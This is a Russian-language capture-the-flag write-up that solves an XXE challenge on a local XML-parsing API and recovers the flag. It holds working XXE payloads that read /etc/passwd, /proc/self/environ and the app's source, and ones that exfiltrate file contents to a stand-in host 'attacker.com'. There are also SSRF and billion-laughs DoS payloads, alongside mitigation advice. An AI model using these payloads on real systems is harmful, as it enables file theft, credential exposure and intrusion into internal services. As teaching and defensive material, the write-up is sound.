# 🎯 Решение CTF Challenge - XXE Vulnerability

## Описание задания

Целью данного CTF задания является нахождение флага формата `centralctf{}`, который хранится на сервере. Сервис предоставляет API для парсинга XML документов, и содержит уязвимость **XXE (XML External Entity)**.

## Что такое XXE?

**XML External Entity (XXE)** - это уязвимость в веб-приложениях, которая возникает, когда XML парсер неправильно сконфигурирован и обрабатывает внешние сущности (external entities). Это позволяет атакующему:

- Читать локальные файлы на сервере
- Выполнять SSRF (Server-Side Request Forgery) атаки
- Вызывать Denial of Service (DoS)
- В некоторых случаях выполнять код

## Пошаговое решение

### Шаг 1: Разведка

1. Откройте веб-интерфейс: `http://localhost:5000`
2. Изучите доступные endpoints:
   - `/` - главная страница
   - `/api/parse` - endpoint для парсинга XML
   - `/api/example` - пример валидного XML
   - `/hint` - подсказки

3. Отправьте тестовый XML через форму:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>Test User</name>
    <email>test@example.com</email>
</user>
```

4. Изучите ответ сервера - он парсит XML и возвращает его содержимое.

### Шаг 2: Проверка наличия XXE уязвимости

Отправьте XML с простой внутренней сущностью (entity):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY hello "Hello from entity!">
]>
<data>
  <value>&hello;</value>
</data>
```

**Ожидаемый результат:**

```json
{
  "message": "XML successfully parsed!",
  "root_tag": "data",
  "elements": {
    "value": "Hello from entity!"
  }
}
```

✅ Если вы видите "Hello from entity!" в ответе - сервер обрабатывает XML сущности! Это означает, что уязвимость присутствует.

### Шаг 3: Эксплуатация XXE для чтения файлов

Теперь попробуем прочитать локальный файл с помощью внешней сущности:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>
  <value>&xxe;</value>
</data>
```

Если это работает, вы увидите содержимое файла `/etc/hostname` в ответе.

### Шаг 4: Получение флага

Согласно подсказкам, флаг находится в файле `flag.txt`. В Docker контейнере приложение расположено в директории `/app`, поэтому попробуем прочитать `/app/flag.txt`:

**Финальный эксплойт:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<data>
  <value>&xxe;</value>
</data>
```

### Шаг 5: Отправка эксплойта

#### Вариант A: Через веб-интерфейс

1. Откройте `http://localhost:5000`
2. Вставьте XML выше в текстовое поле
3. Нажмите "Отправить XML"
4. Получите флаг в ответе!

#### Вариант B: С помощью curl

```bash
curl -X POST http://localhost:5000/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<data>
  <value>&xxe;</value>
</data>'
```

#### Вариант C: С помощью Python скрипта

```bash
python3 solve.py -u http://localhost:5000/api/parse -f /app/flag.txt
```

Или попробовать все возможные пути:

```bash
python3 solve.py -u http://localhost:5000/api/parse --try-all
```

### Шаг 6: Получение результата

**Ответ сервера:**

```json
{
  "message": "XML successfully parsed!",
  "root_tag": "data",
  "elements": {
    "value": "centralctf{xxe_1s_d4ng3r0us_p4rs1ng_vuln3r4b1l1ty}"
  }
}
```

🎉 **Флаг найден:** `centralctf{xxe_1s_d4ng3r0us_p4rs1ng_vuln3r4b1l1ty}`

## Альтернативные пути к флагу

В зависимости от конфигурации, флаг может быть доступен по разным путям:

```xml
<!-- Вариант 1: /app/flag.txt -->
<!ENTITY xxe SYSTEM "file:///app/flag.txt">

<!-- Вариант 2: /flag.txt -->
<!ENTITY xxe SYSTEM "file:///flag.txt">

<!-- Вариант 3: Относительный путь -->
<!ENTITY xxe SYSTEM "flag.txt">

<!-- Вариант 4: С file://localhost -->
<!ENTITY xxe SYSTEM "file://localhost/app/flag.txt">
```

## Расширенные техники

### Использование параметрических сущностей

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///app/flag.txt">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
  %eval;
  %exfil;
]>
<data></data>
```

### XXE через DTD файл

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>
  <value>&xxe;</value>
</data>
```

Где `evil.dtd` содержит:

```xml
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
```

### Чтение других интересных файлов

```xml
<!-- Чтение /etc/passwd -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Чтение исходного кода приложения -->
<!ENTITY xxe SYSTEM "file:///app/app.py">

<!-- Чтение переменных окружения (через /proc) -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

## Техническое объяснение уязвимости

### Уязвимый код (app.py)

```python
parser = etree.XMLParser(resolve_entities=True, no_network=False)
doc = etree.fromstring(xml_data, parser)
```

**Проблемы:**
- `resolve_entities=True` - включает обработку внешних сущностей
- `no_network=False` - позволяет делать сетевые запросы
- Отсутствует валидация и фильтрация входных данных

### Как это должно быть исправлено

```python
# Вариант 1: Безопасная конфигурация lxml
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)

# Вариант 2: Использование defusedxml
import defusedxml.ElementTree as ET
doc = ET.fromstring(xml_data)
```

## Инструменты для эксплуатации

### 1. curl (встроенный)

```bash
curl -X POST http://localhost:5000/api/parse \
  -H "Content-Type: application/xml" \
  -d @exploit.xml
```

### 2. Python requests

```python
import requests

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<data><value>&xxe;</value></data>'''

r = requests.post('http://localhost:5000/api/parse',
                  data=payload,
                  headers={'Content-Type': 'application/xml'})
print(r.json())
```

### 3. Burp Suite

1. Настройте прокси
2. Перехватите запрос к `/api/parse`
3. Измените тело запроса на XXE payload
4. Отправьте запрос

### 4. Предоставленный скрипт solve.py

```bash
# Базовое использование
python3 solve.py

# С детальным выводом
python3 solve.py -v

# Тест уязвимости
python3 solve.py --test

# Попытка разных путей
python3 solve.py --try-all

# Чтение другого файла
python3 solve.py -f /etc/passwd
```

## Защита от XXE

### 1. Отключение внешних сущностей

```python
# lxml
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# xml.etree.ElementTree
from xml.etree.ElementTree import XMLParser
parser = XMLParser()
parser.entity = {}
```

### 2. Использование безопасных библиотек

```python
import defusedxml.ElementTree as ET
import defusedxml.lxml as lxml
```

### 3. Валидация входных данных

```python
# Проверка на наличие DTD и сущностей
if '<!DOCTYPE' in xml_data or '<!ENTITY' in xml_data:
    raise ValueError("DTD and entities are not allowed")
```

### 4. Ограничение размера XML

```python
MAX_XML_SIZE = 1024 * 1024  # 1MB
if len(xml_data) > MAX_XML_SIZE:
    raise ValueError("XML too large")
```

### 5. Использование XML Schema (XSD) для валидации

```python
from lxml import etree

schema = etree.XMLSchema(etree.parse('schema.xsd'))
doc = etree.fromstring(xml_data)
if not schema.validate(doc):
    raise ValueError("XML validation failed")
```

## Дополнительные атаки через XXE

### SSRF (Server-Side Request Forgery)

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
```

### Billion Laughs Attack (DoS)

```xml
<!DOCTYPE data [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... и так далее ... -->
]>
```

### Чтение через PHP wrappers (если PHP доступен)

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/flag.txt">
]>
```

## Checklist для поиска XXE

- [ ] Найти endpoints, принимающие XML
- [ ] Проверить обработку внутренних сущностей
- [ ] Попробовать внешние сущности с file://
- [ ] Протестировать различные пути к файлам
- [ ] Попробовать параметрические сущности
- [ ] Проверить возможность SSRF через http://
- [ ] Попытаться использовать различные протоколы (ftp://, gopher://, etc.)

## Полезные ресурсы

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [HackTricks - XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [CWE-611](https://cwe.mitre.org/data/definitions/611.html)

## Заключение

XXE - это серьезная уязвимость, которая может привести к:
- Раскрытию конфиденциальной информации
- SSRF атакам на внутренние сервисы
- Отказу в обслуживании (DoS)
- В редких случаях - выполнению кода

**Всегда:**
- Отключайте обработку внешних сущностей
- Используйте безопасные библиотеки для парсинга XML
- Валидируйте и фильтруйте входные данные
- Применяйте принцип наименьших привилегий

---

**🎯 Поздравляем с успешным решением CTF задания!**

Надеемся, вы узнали что-то новое об XML уязвимостях и научились их эксплуатировать (в легальном контексте!).

**Remember:** Используйте эти знания только в образовательных целях и в контролируемых средах!